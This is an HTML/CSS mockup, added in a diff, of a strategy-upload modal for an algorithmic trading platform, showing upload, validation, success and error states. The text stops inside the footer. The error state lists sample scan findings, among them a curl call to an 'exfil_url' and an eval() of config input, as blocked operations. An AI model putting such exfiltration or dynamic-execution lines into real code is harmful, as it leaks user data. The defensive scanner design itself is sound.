@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ATP — Upload Strategy Modal</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', system-ui, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      height: 100vh;
+      display: flex;
+      overflow: hidden;
+      font-size: 13px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ── SIDEBAR (same as all pages) ── */
+    .sidebar { width: 220px; min-width: 220px; background: #161b22; border-right: 1px solid #21262d; display: flex; flex-direction: column; height: 100vh; }
+    .sidebar-logo { padding: 16px; border-bottom: 1px solid #21262d; display: flex; align-items: center; gap: 10px; }
+    .logo-mark { width: 30px; height: 30px; background: linear-gradient(135deg, #1f6feb 0%, #388bfd 100%); border-radius: 7px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 12px; color: #fff; letter-spacing: -0.5px; flex-shrink: 0; }
+    .logo-text-primary { font-size: 13px; font-weight: 700; color: #e6edf3; letter-spacing: -0.2px; line-height: 1.2; }
+    .logo-text-secondary { font-size: 10px; color: #6e7681; line-height: 1.2; }
+    .sidebar-nav { flex: 1; padding: 10px 0; overflow-y: auto; }
+    .nav-section-label { padding: 10px 16px 4px; font-size: 10px; font-weight: 600; color: #6e7681; text-transform: uppercase; letter-spacing: 0.7px; }
+    .nav-item { display: flex; align-items: center; gap: 9px; padding: 7px 16px; color: #8b949e; cursor: pointer; font-size: 13px; font-weight: 500; transition: all 0.12s ease; border-left: 2px solid transparent; }
+    .nav-item:hover { background: rgba(33,38,45,0.8); color: #c9d1d9; }
+    .nav-item.active { background: rgba(56,139,253,0.08); color: #388bfd; border-left-color: #388bfd; }
+    .nav-icon { width: 15px; height: 15px; flex-shrink: 0; }
+    .nav-badge { margin-left: auto; background: #21262d; color: #8b949e; font-size: 10px; font-weight: 600; padding: 1px 6px; border-radius: 10px; }
+    .nav-item.active .nav-badge { background: rgba(56,139,253,0.15); color: #388bfd; }
+    .nav-live-dot { margin-left: auto; width: 6px; height: 6px; border-radius: 50%; background: #3fb950; animation: live-pulse 2s infinite; }
+    @keyframes live-pulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(63,185,80,0.4); }
+      50% { opacity: 0.7; box-shadow: 0 0 0 4px rgba(63,185,80,0); }
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .nav-divider { height: 1px; background: #21262d; margin: 6px 0; }
+    .sidebar-bottom { padding: 12px 16px; border-top: 1px solid #21262d; display: flex; align-items: center; gap: 9px; }
+    .user-avatar { width: 26px; height: 26px; border-radius: 50%; background: linear-gradient(135deg, #388bfd, #1f6feb); display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; color: #fff; flex-shrink: 0; }
+    .user-info { flex: 1; min-width: 0; }
+    .user-name { font-size: 12px; font-weight: 600; color: #c9d1d9; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .user-plan { font-size: 10px; color: #6e7681; }
+
+    /* ── MAIN ── */
+    .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0; position: relative; }
+    .topbar { height: 46px; padding: 0 20px; border-bottom: 1px solid #21262d; display: flex; align-items: center; justify-content: space-between; background: #0d1117; flex-shrink: 0; }
+    .page-title { font-size: 14px; font-weight: 700; color: #e6edf3; letter-spacing: -0.2px; }
+
+    /* Blurred strategies table behind modal */
+    .page-content { flex: 1; overflow-y: auto; padding: 16px 20px; filter: blur(2px); opacity: 0.4; pointer-events: none; }
+    .dummy-table { background: #161b22; border: 1px solid #21262d; border-radius: 10px; overflow: hidden; }
+    .dummy-row { display: flex; align-items: center; gap: 14px; padding: 10px 14px; border-bottom: 1px solid #21262d; }
+    .dummy-row:last-child { border-bottom: none; }
+    .dummy-block { background: #21262d; border-radius: 4px; height: 10px; }
+
+    /* ── MODAL OVERLAY ── */
+    .modal-overlay {
+      position: absolute; inset: 0;
+      background: rgba(1,4,9,0.72);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 10; backdrop-filter: blur(2px);
+    }
+
+    /* ── STATE DEMO CONTROLS ── */
+    .demo-bar {
+      position: absolute; top: 10px; right: 12px; z-index: 20;
+      display: flex; align-items: center; gap: 6px;
+      background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+      padding: 6px 10px;
+    }
+    .demo-label { font-size: 10px; color: #6e7681; font-weight: 600; text-transform: uppercase; letter-spacing: 0.6px; margin-right: 4px; }
+    .demo-btn {
+      padding: 3px 10px; border-radius: 5px; font-size: 11px; font-weight: 500;
+      cursor: pointer; border: 1px solid #30363d; background: transparent; color: #8b949e;
+      font-family: inherit; transition: all 0.1s;
+    }
+    .demo-btn:hover { background: #21262d; color: #c9d1d9; }
+    .demo-btn.active { background: rgba(56,139,253,0.12); border-color: rgba(56,139,253,0.3); color: #388bfd; }
+
+    /* ── MODAL ── */
+    .modal {
+      background: #161b22; border: 1px solid #30363d; border-radius: 12px;
+      width: 520px; max-width: 95vw;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.65);
+      overflow: hidden;
+    }
+    .modal-header {
+      padding: 14px 18px; border-bottom: 1px solid #21262d;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .modal-title { font-size: 14px; font-weight: 700; color: #e6edf3; letter-spacing: -0.2px; }
+    .modal-step-track { display: flex; align-items: center; gap: 6px; }
+    .step-pip {
+      display: flex; align-items: center; gap: 5px;
+      font-size: 10px; font-weight: 600; color: #6e7681;
+    }
+    .step-pip.active { color: #388bfd; }
+    .step-pip.done { color: #3fb950; }
+    .step-dot {
+      width: 18px; height: 18px; border-radius: 50%; border: 1.5px solid #30363d;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 9px; font-weight: 700; color: #6e7681; flex-shrink: 0;
+    }
+    .step-pip.active .step-dot { border-color: #388bfd; color: #388bfd; background: rgba(56,139,253,0.1); }
+    .step-pip.done .step-dot { border-color: #3fb950; background: rgba(63,185,80,0.1); }
+    .step-connector { width: 20px; height: 1px; background: #30363d; }
+    .step-connector.done { background: #3fb950; }
+    .modal-close { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; border-radius: 6px; border: 1px solid #30363d; background: transparent; color: #6e7681; cursor: pointer; transition: all 0.12s; }
+    .modal-close:hover { background: #21262d; color: #c9d1d9; }
+
+    .modal-body { padding: 18px; }
+
+    /* ── UPLOAD STATE ── */
+    .dropzone {
+      border: 1.5px dashed #30363d; border-radius: 8px;
+      padding: 32px 20px; text-align: center; cursor: pointer;
+      transition: all 0.15s; background: #0d1117;
+      margin-bottom: 14px;
+    }
+    .dropzone:hover, .dropzone.dragover {
+      border-color: #388bfd; background: rgba(56,139,253,0.04);
+    }
+    .dz-icon { color: #6e7681; margin-bottom: 10px; }
+    .dz-icon svg { width: 32px; height: 32px; }
+    .dz-title { font-size: 13px; font-weight: 600; color: #c9d1d9; margin-bottom: 4px; }
+    .dz-sub { font-size: 11px; color: #6e7681; }
+    .dz-sub b { color: #388bfd; }
+    .dz-constraint { font-size: 10px; color: #6e7681; margin-top: 6px; }
+
+    /* File selected state */
+    .file-selected {
+      border: 1.5px solid rgba(63,185,80,0.3); border-radius: 8px;
+      padding: 10px 14px; background: rgba(63,185,80,0.05);
+      display: flex; align-items: center; gap: 10px;
+      margin-bottom: 14px;
+    }
+    .file-icon { color: #3fb950; flex-shrink: 0; }
+    .file-icon svg { width: 20px; height: 20px; }
+    .file-name { font-size: 12px; font-weight: 600; color: #e6edf3; font-family: 'SF Mono','Consolas',monospace; }
+    .file-meta { font-size: 10px; color: #6e7681; margin-top: 1px; }
+    .file-remove { margin-left: auto; background: transparent; border: none; color: #6e7681; cursor: pointer; padding: 2px; border-radius: 4px; display: flex; align-items: center; justify-content: center; }
+    .file-remove:hover { color: #f85149; }
+
+    .form-field { margin-bottom: 14px; }
+    .form-label { display: block; font-size: 11px; font-weight: 600; color: #6e7681; text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 6px; }
+    .form-label span { font-weight: 400; text-transform: none; color: #6e7681; letter-spacing: 0; font-size: 10px; margin-left: 4px; }
+    .form-input {
+      width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
+      padding: 7px 10px; color: #c9d1d9; font-size: 12px; outline: none; font-family: inherit;
+      transition: border-color 0.12s;
+    }
+    .form-input:focus { border-color: #388bfd; }
+    .form-input::placeholder { color: #6e7681; }
+    textarea.form-input { resize: vertical; min-height: 60px; }
+
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+    .form-hint { font-size: 10px; color: #6e7681; margin-top: 4px; }
+    .form-hint a { color: #388bfd; cursor: pointer; }
+
+    .modal-footer {
+      padding: 12px 18px; border-top: 1px solid #21262d;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .footer-meta { font-size: 10px; color: #6e7681; display: flex; align-items: center; gap: 5px; }
+    .footer-meta svg { width: 11px; height: 11px; }
+    .footer-actions { display: flex; gap: 8px; }
+
+    .btn { display: inline-flex; align-items: center; gap: 5px; padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 500; cursor: pointer; border: 1px solid transparent; transition: all 0.12s ease; white-space: nowrap; font-family: inherit; }
+    .btn svg { width: 12px; height: 12px; flex-shrink: 0; }
+    .btn-ghost { background: transparent; border-color: #30363d; color: #8b949e; }
+    .btn-ghost:hover { background: #21262d; color: #c9d1d9; border-color: #484f58; }
+    .btn-primary { background: #1f6feb; border-color: #1f6feb; color: #fff; }
+    .btn-primary:hover { background: #388bfd; }
+    .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+    .btn-green { background: rgba(63,185,80,0.1); border-color: rgba(63,185,80,0.3); color: #3fb950; }
+    .btn-green:hover { background: rgba(63,185,80,0.18); }
+
+    /* ── VALIDATING STATE ── */
+    .validation-progress { padding: 4px 0; }
+    .vp-title { font-size: 13px; font-weight: 600; color: #e6edf3; margin-bottom: 4px; display: flex; align-items: center; gap: 8px; }
+    .vp-sub { font-size: 11px; color: #6e7681; margin-bottom: 18px; font-family: 'SF Mono','Consolas',monospace; }
+    .vp-steps { display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; }
+    .vp-step { display: flex; align-items: center; gap: 10px; padding: 8px 12px; border-radius: 7px; background: #0d1117; border: 1px solid #21262d; }
+    .vp-step-icon { width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .vp-step-icon.done { background: rgba(63,185,80,0.1); border: 1px solid rgba(63,185,80,0.25); color: #3fb950; }
+    .vp-step-icon.done svg { width: 12px; height: 12px; }
+    .vp-step-icon.running { background: rgba(56,139,253,0.1); border: 1px solid rgba(56,139,253,0.25); }
+    .vp-step-icon.running .spinner { width: 12px; height: 12px; border: 2px solid rgba(56,139,253,0.2); border-top-color: #388bfd; border-radius: 50%; animation: spin 0.7s linear infinite; }
+    .vp-step-icon.pending { background: #161b22; border: 1px solid #21262d; }
+    .vp-step-icon.pending svg { width: 12px; height: 12px; color: #6e7681; }
+    .vp-step-text { font-size: 12px; font-weight: 500; }
+    .vp-step-text.done { color: #c9d1d9; }
+    .vp-step-text.running { color: #388bfd; }
+    .vp-step-text.pending { color: #6e7681; }
+    .vp-step-meta { margin-left: auto; font-size: 10px; font-family: 'SF Mono','Consolas',monospace; }
+    .vp-step-meta.done { color: #3fb950; }
+    .vp-step-meta.running { color: #6e7681; }
+    .vp-step-meta.pending { color: #6e7681; }
+
+    /* ── RESULT STATES ── */
+    .result-success { background: rgba(63,185,80,0.06); border: 1px solid rgba(63,185,80,0.2); border-radius: 8px; padding: 16px; margin-bottom: 14px; text-align: center; }
+    .result-icon-success { color: #3fb950; margin-bottom: 8px; }
+    .result-icon-success svg { width: 32px; height: 32px; }
+    .result-title { font-size: 14px; font-weight: 700; color: #e6edf3; margin-bottom: 3px; }
+    .result-sub { font-size: 11px; color: #6e7681; }
+
+    .result-error { background: rgba(248,81,73,0.06); border: 1px solid rgba(248,81,73,0.2); border-radius: 8px; padding: 16px; margin-bottom: 14px; }
+    .result-error-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+    .result-error-icon { color: #f85149; flex-shrink: 0; }
+    .result-error-icon svg { width: 18px; height: 18px; }
+    .result-error-title { font-size: 13px; font-weight: 700; color: #f85149; }
+    .result-error-sub { font-size: 11px; color: #8b949e; margin-top: 1px; }
+    .error-list { display: flex; flex-direction: column; gap: 6px; }
+    .error-item { display: flex; align-items: flex-start; gap: 8px; padding: 7px 10px; background: rgba(248,81,73,0.05); border: 1px solid rgba(248,81,73,0.15); border-radius: 6px; }
+    .error-item-icon { color: #f85149; flex-shrink: 0; margin-top: 1px; }
+    .error-item-icon svg { width: 12px; height: 12px; }
+    .error-item-msg { font-size: 11px; color: #c9d1d9; font-family: 'SF Mono','Consolas',monospace; }
+    .error-item-line { font-size: 10px; color: #6e7681; margin-top: 2px; }
+
+    .scan-summary {
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 14px;
+    }
+    .ss-cell { background: #0d1117; border: 1px solid #21262d; border-radius: 7px; padding: 8px 12px; text-align: center; }
+    .ss-value { font-size: 17px; font-weight: 700; letter-spacing: -0.3px; }
+    .ss-label { font-size: 10px; color: #6e7681; margin-top: 2px; }
+  </style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+  <div class="sidebar-logo">
+    <div class="logo-mark">ATP</div>
+    <div>
+      <div class="logo-text-primary">AlgoTrader</div>
+      <div class="logo-text-secondary">Algorithmic Trading Platform</div>
+    </div>
+  </div>
+  <nav class="sidebar-nav">
+    <div class="nav-section-label">Platform</div>
+    <div class="nav-item"><svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M1.5 1.75a.25.25 0 00-.25.25v11.5c0 .138.112.25.25.25h13a.25.25 0 00.25-.25V3.5H12a.5.5 0 01-.5-.5V1.5H1.75z"/></svg>Overview</div>
+    <div class="nav-item active"><svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8A1 1 0 003 13.5v.75A1.75 1.75 0 011.25 16h-.5A1.75 1.75 0 010 14.25v-12A2.5 2.5 0 012 2.5z"/></svg>Strategies<span class="nav-badge">6</span></div>
+    <div class="nav-divider"></div>
+    <div class="nav-section-label">Trading</div>
+    <div class="nav-item"><svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M1.5 7.5h13a.5.5 0 000-1h-13a.5.5 0 000 1z"/></svg>Backtests<span class="nav-badge">47</span></div>
+    <div class="nav-item"><svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1z"/></svg>Live Trading<div class="nav-live-dot"></div></div>
+    <div class="nav-divider"></div>
+    <div class="nav-section-label">Account</div>
+    <div class="nav-item"><svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M10.561 8.073a6.005 6.005 0 013.432 4.177.75.75 0 11-1.494.15 4.5 4.5 0 00-8.997 0 .75.75 0 01-1.494-.15 6.005 6.005 0 013.432-4.177 3.5 3.5 0 111.121 0z"/></svg>Profile</div>
+  </nav>
+  <div class="sidebar-bottom">
+    <div class="user-avatar">AK</div>
+    <div class="user-info">
+      <div class="user-name">Andrew K.</div>
+      <div class="user-plan">Pro plan</div>
+    </div>
+  </div>
+</aside>
+
+<!-- MAIN -->
+<div class="main">
+  <div class="topbar">
+    <span class="page-title">Strategies</span>
+  </div>
+
+  <!-- Blurred strategies table behind modal -->
+  <div class="page-content">
+    <div class="dummy-table">
+      <div class="dummy-row"><div class="dummy-block" style="width:140px;"></div><div class="dummy-block" style="width:60px;"></div><div class="dummy-block" style="width:40px;margin-left:auto;"></div></div>
+      <div class="dummy-row"><div class="dummy-block" style="width:180px;"></div><div class="dummy-block" style="width:50px;"></div><div class="dummy-block" style="width:55px;margin-left:auto;"></div></div>
+      <div class="dummy-row"><div class="dummy-block" style="width:120px;"></div><div class="dummy-block" style="width:70px;"></div><div class="dummy-block" style="width:45px;margin-left:auto;"></div></div>
+      <div class="dummy-row"><div class="dummy-block" style="width:160px;"></div><div class="dummy-block" style="width:55px;"></div><div class="dummy-block" style="width:50px;margin-left:auto;"></div></div>
+    </div>
+  </div>
+
+  <!-- Demo state switcher -->
+  <div class="demo-bar">
+    <span class="demo-label">State</span>
+    <button class="demo-btn active" onclick="showState('upload')">1 Upload</button>
+    <button class="demo-btn" onclick="showState('validating')">2 Validating</button>
+    <button class="demo-btn" onclick="showState('success')">3 Success</button>
+    <button class="demo-btn" onclick="showState('error')">3 Error</button>
+  </div>
+
+  <!-- MODAL OVERLAY -->
+  <div class="modal-overlay">
+    <div class="modal">
+
+      <!-- Header (shared across states) -->
+      <div class="modal-header">
+        <span class="modal-title" id="modalTitle">Upload Strategy</span>
+        <div style="display:flex;align-items:center;gap:12px;">
+          <div class="modal-step-track" id="stepTrack">
+            <div class="step-pip active" id="step1"><div class="step-dot">1</div>Upload</div>
+            <div class="step-connector" id="conn1"></div>
+            <div class="step-pip" id="step2"><div class="step-dot">2</div>Validate</div>
+            <div class="step-connector" id="conn2"></div>
+            <div class="step-pip" id="step3"><div class="step-dot">3</div>Done</div>
+          </div>
+          <button class="modal-close">
+            <svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"/></svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- ── STATE 1: UPLOAD FORM ── -->
+      <div id="state-upload" class="modal-body">
+        <!-- Drop zone (file selected) -->
+        <div class="file-selected">
+          <div class="file-icon">
+            <svg viewBox="0 0 16 16" fill="currentColor"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0113.25 16h-9.5A1.75 1.75 0 012 14.25V1.75zm1.75-.25a.25.25 0 00-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 00.25-.25V6h-2.75A1.75 1.75 0 019 4.25V1.5H3.75zm6.75.56v2.19c0 .138.112.25.25.25h2.19L10.5 2.06z"/></svg>
+          </div>
+          <div>
+            <div class="file-name">momentum_breakout_v2.py</div>
+            <div class="file-meta">4.2 KB &nbsp;·&nbsp; Python &nbsp;·&nbsp; Modified Apr 10, 2026</div>
+          </div>
+          <button class="file-remove" title="Remove file">
+            <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor"><path d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"/></svg>
+          </button>
+        </div>
+
+        <!-- Form fields -->
+        <div class="form-field">
+          <label class="form-label">Strategy Name</label>
+          <input class="form-input" type="text" value="Momentum Breakout v2" />
+        </div>
+        <div class="form-field">
+          <label class="form-label">Description <span>(optional)</span></label>
+          <textarea class="form-input" placeholder="Briefly describe what this strategy does...">Breakout strategy using 20-day high/low channels with ATR-based position sizing. Trend filter via 200-day MA.</textarea>
+        </div>
+        <div class="form-row">
+          <div class="form-field" style="margin-bottom:0;">
+            <label class="form-label">Primary Asset Class</label>
+            <select class="form-input">
+              <option>Equities</option>
+              <option>Crypto</option>
+              <option>Futures</option>
+              <option>Forex</option>
+            </select>
+          </div>
+          <div class="form-field" style="margin-bottom:0;">
+            <label class="form-label">Expected Resolution</label>
+            <select class="form-input">
+              <option>Minute</option>
+              <option>Hour</option>
+              <option>Daily</option>
+              <option>Tick</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-hint" style="margin-top:8px;">
+          <svg style="display:inline;width:10px;height:10px;vertical-align:middle;margin-right:3px;" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm7.25-3.75a.75.75 0 011.5 0v3.5a.75.75 0 01-1.5 0v-3.5zm.75 7a1 1 0 100-2 1 1 0 000 2z"/></svg>
+          Your strategy will be scanned for unsafe operations before use. <a>See security policy.</a>
+        </div>
+      </div>
+
+      <!-- ── STATE 2: VALIDATING ── -->
+      <div id="state-validating" class="modal-body" style="display:none;">
+        <div class="validation-progress">
+          <div class="vp-title">
+            <div style="width:16px;height:16px;border:2px solid rgba(56,139,253,0.2);border-top-color:#388bfd;border-radius:50%;animation:spin 0.7s linear infinite;flex-shrink:0;"></div>
+            Validating momentum_breakout_v2.py
+          </div>
+          <div class="vp-sub">job/scan_b7c3e1 &nbsp;·&nbsp; started 2s ago</div>
+          <div class="vp-steps">
+            <div class="vp-step">
+              <div class="vp-step-icon done">
+                <svg viewBox="0 0 16 16" fill="currentColor"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>
+              </div>
+              <span class="vp-step-text done">File upload &amp; parse</span>
+              <span class="vp-step-meta done">0.1s</span>
+            </div>
+            <div class="vp-step">
+              <div class="vp-step-icon done">
+                <svg viewBox="0 0 16 16" fill="currentColor"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>
+              </div>
+              <span class="vp-step-text done">Python syntax check</span>
+              <span class="vp-step-meta done">0.3s</span>
+            </div>
+            <div class="vp-step">
+              <div class="vp-step-icon running">
+                <div class="spinner"></div>
+              </div>
+              <span class="vp-step-text running">Security scan — checking for blocked operations</span>
+              <span class="vp-step-meta running">running...</span>
+            </div>
+            <div class="vp-step">
+              <div class="vp-step-icon pending">
+                <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zM0 8a8 8 0 1116 0A8 8 0 010 8zm7.25-3.75a.75.75 0 011.5 0v3.5a.75.75 0 01-1.5 0v-3.5zm.75 7a1 1 0 100-2 1 1 0 000 2z"/></svg>
+              </div>
+              <span class="vp-step-text pending">LEAN interface check</span>
+              <span class="vp-step-meta pending">—</span>
+            </div>
+            <div class="vp-step">
+              <div class="vp-step-icon pending">
+                <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zM0 8a8 8 0 1116 0A8 8 0 010 8zm7.25-3.75a.75.75 0 011.5 0v3.5a.75.75 0 01-1.5 0v-3.5zm.75 7a1 1 0 100-2 1 1 0 000 2z"/></svg>
+              </div>
+              <span class="vp-step-text pending">Store to S3</span>
+              <span class="vp-step-meta pending">—</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── STATE 3a: VALIDATION SUCCESS ── -->
+      <div id="state-success" class="modal-body" style="display:none;">
+        <div class="result-success">
+          <div class="result-icon-success">
+            <svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.8">
+              <circle cx="16" cy="16" r="13" stroke="currentColor"/>
+              <path d="M10 16l4 4 8-8" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="result-title">Validation Passed</div>
+          <div class="result-sub">momentum_breakout_v2.py is ready to use</div>
+        </div>
+
+        <div class="scan-summary">
+          <div class="ss-cell">
+            <div class="ss-value" style="color:#3fb950;">0</div>
+            <div class="ss-label">Security violations</div>
+          </div>
+          <div class="ss-cell">
+            <div class="ss-value" style="color:#3fb950;">0</div>
+            <div class="ss-label">Syntax errors</div>
+          </div>
+          <div class="ss-cell">
+            <div class="ss-value" style="color:#e6edf3;">2</div>
+            <div class="ss-label">Warnings</div>
+          </div>
+        </div>
+
+        <div style="background:#0d1117;border:1px solid #21262d;border-radius:7px;padding:10px 14px;font-size:11px;font-family:'SF Mono','Consolas',monospace;">
+          <div style="display:flex;align-items:baseline;gap:10px;margin-bottom:5px;">
+            <span style="color:#d29922;font-weight:700;font-size:10px;background:rgba(210,153,34,0.1);border:1px solid rgba(210,153,34,0.2);padding:0 5px;border-radius:3px;flex-shrink:0;">WARN</span>
+            <span style="color:#c9d1d9;">Imported <span style="color:#e6edf3;">pandas</span> — large imports may increase worker cold-start time</span>
+          </div>
+          <div style="display:flex;align-items:baseline;gap:10px;">
+            <span style="color:#d29922;font-weight:700;font-size:10px;background:rgba(210,153,34,0.1);border:1px solid rgba(210,153,34,0.2);padding:0 5px;border-radius:3px;flex-shrink:0;">WARN</span>
+            <span style="color:#c9d1d9;"><span style="color:#e6edf3;">Initialize()</span> missing explicit resolution — defaulting to daily</span>
+          </div>
+        </div>
+
+        <div style="margin-top:12px;padding:10px 12px;background:rgba(56,139,253,0.06);border:1px solid rgba(56,139,253,0.18);border-radius:7px;font-size:11px;color:#8b949e;display:flex;align-items:center;gap:8px;">
+          <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor" style="color:#388bfd;flex-shrink:0;"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM6.5 7.75A.75.75 0 017.25 7h1a.75.75 0 01.75.75v2.75h.25a.75.75 0 010 1.5h-2a.75.75 0 010-1.5h.25v-2h-.25a.75.75 0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>
+          Strategy uploaded to S3 &nbsp;·&nbsp; <span style="color:#388bfd;font-family:'SF Mono','Consolas',monospace;">s3://atp-strategies/user_ak/momentum_breakout_v2.py</span>
+        </div>
+      </div>
+
+      <!-- ── STATE 3b: VALIDATION ERROR ── -->
+      <div id="state-error" class="modal-body" style="display:none;">
+        <div class="result-error">
+          <div class="result-error-header">
+            <div class="result-error-icon">
+              <svg viewBox="0 0 16 16" fill="currentColor"><path d="M4.47.22A.75.75 0 015 0h6a.75.75 0 01.53.22l4.25 4.25c.141.14.22.331.22.53v6a.75.75 0 01-.22.53l-4.25 4.25A.75.75 0 0111 16H5a.75.75 0 01-.53-.22L.22 11.53A.75.75 0 010 11V5a.75.75 0 01.22-.53L4.47.22zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5H5.31zM8 4a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 018 4zm0 8a1 1 0 100-2 1 1 0 000 2z"/></svg>
+            </div>
+            <div>
+              <div class="result-error-title">Validation Failed</div>
+              <div class="result-error-sub">3 security violations found — strategy cannot be executed</div>
+            </div>
+          </div>
+          <div class="error-list">
+            <div class="error-item">
+              <div class="error-item-icon"><svg viewBox="0 0 16 16" fill="currentColor"><path d="M4.28 3.22a.75.75 0 00-1.06 1.06L6.94 8l-3.72 3.72a.75.75 0 101.06 1.06L8 9.06l3.72 3.72a.75.75 0 101.06-1.06L9.06 8l3.72-3.72a.75.75 0 00-1.06-1.06L8 6.94 4.28 3.22z"/></svg></div>
+              <div>
+                <div class="error-item-msg">Blocked module: <b>subprocess</b> — os.system() call detected</div>
+                <div class="error-item-line">Line 42 &nbsp;·&nbsp; <span style="color:#f85149;">subprocess.run(["curl", self.exfil_url])</span></div>
+              </div>
+            </div>
+            <div class="error-item">
+              <div class="error-item-icon"><svg viewBox="0 0 16 16" fill="currentColor"><path d="M4.28 3.22a.75.75 0 00-1.06 1.06L6.94 8l-3.72 3.72a.75.75 0 101.06 1.06L8 9.06l3.72 3.72a.75.75 0 101.06-1.06L9.06 8l3.72-3.72a.75.75 0 00-1.06-1.06L8 6.94 4.28 3.22z"/></svg></div>
+              <div>
+                <div class="error-item-msg">Blocked builtin: <b>eval()</b> — dynamic code execution not permitted</div>
+                <div class="error-item-line">Line 87 &nbsp;·&nbsp; <span style="color:#f85149;">eval(self.config["formula"])</span></div>
+              </div>
+            </div>
+            <div class="error-item">
+              <div class="error-item-icon"><svg viewBox="0 0 16 16" fill="currentColor"><path d="M4.28 3.22a.75.75 0 00-1.06 1.06L6.94 8l-3.72 3.72a.75.75 0 101.06 1.06L8 9.06l3.72 3.72a.75.75 0 101.06-1.06L9.06 8l3.72-3.72a.75.75 0 00-1.06-1.06L8 6.94 4.28 3.22z"/></svg></div>
+              <div>
+                <div class="error-item-msg">Blocked module: <b>socket</b> — raw network access not permitted</div>
+                <div class="error-item-line">Line 103 &nbsp;·&nbsp; <span style="color:#f85149;">import socket</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div style="font-size:11px;color:#6e7681;padding:0 2px;">Remove the blocked operations and re-upload. <a style="color:#388bfd;cursor:pointer;">View security policy.</a></div>
+      </div>
+
+      <!-- Footer (shared, changes by state) -->
+      <div class="modal-footer" id="modalFooter">
+        <div class="footer-meta" id="footerMeta">
+          <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8.75 7.018V5.75A2.75 2.75 0 006 3a2.75 2.75 0 00-2.75 2.75v1.268a1.75 1.75 0 00-.75 1.432v3.1c0 .966.784 1.75 1.75 1.75h7.5A1.75 1.75 0 0013.5 12.55v-3.1a1.75 1.75 0 00-.75-1.432z"/></svg>
